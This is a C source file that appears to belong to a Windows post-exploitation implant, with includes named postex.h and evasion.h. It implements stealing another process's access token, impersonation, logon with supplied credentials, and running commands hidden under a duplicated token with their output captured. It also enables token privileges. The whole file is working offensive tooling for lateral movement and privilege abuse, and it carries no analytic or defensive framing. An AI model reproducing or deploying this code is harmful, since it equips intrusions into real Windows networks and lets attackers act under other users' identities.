/**
 * token_ops.c - Token steal / make / revert
 */
#include <windows.h>
#include "../../include/postex.h"
#include "../../include/evasion.h"

BOOL token_steal(DWORD pid) {
    HANDLE tok = NULL;
    if (!cred_steal_token(pid, &tok))
        return FALSE;
    BOOL ok = cred_impersonate_token(tok);
    CloseHandle(tok);
    return ok;
}

BOOL token_make(const char *domain, const char *username, const char *password) {
    wchar_t wdom[256] = {0}, wuser[256] = {0}, wpass[256] = {0};
    if (domain)
        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wdom, 256);
    if (username)
        MultiByteToWideChar(CP_UTF8, 0, username, -1, wuser, 256);
    if (password)
        MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, 256);
    return make_token(wdom, wuser, wpass);
}

BOOL token_revert(void) {
    return cred_revert_to_self();
}

/* evasion.h exports */
BOOL steal_token(DWORD target_pid) {
    return token_steal(target_pid);
}

BOOL make_token(const wchar_t *domain, const wchar_t *user, const wchar_t *password) {
    HANDLE hToken = NULL;
    if (!LogonUserW(user, domain, password,
                    LOGON32_LOGON_NEW_CREDENTIALS,
                    LOGON32_PROVIDER_WINNT50, &hToken))
        return FALSE;
    BOOL ok = ImpersonateLoggedOnUser(hToken);
    CloseHandle(hToken);
    return ok;
}

BOOL token_runas(const char* command, PBYTE* output, PDWORD output_size) {
    HANDLE hToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
            return FALSE;
    }

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hDup)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        CloseHandle(hDup);
        return FALSE;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;

    char cmd_buf[4096];
    lstrcpynA(cmd_buf, command, sizeof(cmd_buf));

    STARTUPINFOW siw;
    ZeroMemory(&siw, sizeof(siw));
    siw.cb = sizeof(siw);
    siw.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    siw.hStdOutput = hWritePipe;
    siw.hStdError = hWritePipe;
    siw.hStdInput = NULL;
    siw.wShowWindow = SW_HIDE;

    WCHAR wcmd[4096];
    MultiByteToWideChar(CP_ACP, 0, cmd_buf, -1, wcmd, 4096);

    BOOL created = CreateProcessWithTokenW(
        hDup, LOGON_WITH_PROFILE, NULL, wcmd, CREATE_NO_WINDOW,
        NULL, NULL, &siw, &pi
    );

    if (!created) {
        created = CreateProcessAsUserA(
            hDup, NULL, cmd_buf, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
        );
    }

    if (!created) {
        BOOL ok = ImpersonateLoggedOnUser(hDup);
        if (ok) {
            created = CreateProcessA(NULL, cmd_buf, NULL, NULL, TRUE,
                                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            RevertToSelf();
        }
    }

    CloseHandle(hDup);
    CloseHandle(hWritePipe);

    if (!created) {
        CloseHandle(hReadPipe);
        return FALSE;
    }

    DWORD buf_cap = 65536;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_cap);
    DWORD total = 0, bytesRead = 0;
    while (ReadFile(hReadPipe, buf + total, buf_cap - total - 1, &bytesRead, NULL) && bytesRead > 0) {
        total += bytesRead;
        if (total >= buf_cap - 1) break;
    }
    buf[total] = '\0';

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    *output = buf;
    *output_size = total;
    return TRUE;
}

BOOL enable_privilege(const wchar_t *privilege_name) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privilege_name, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}
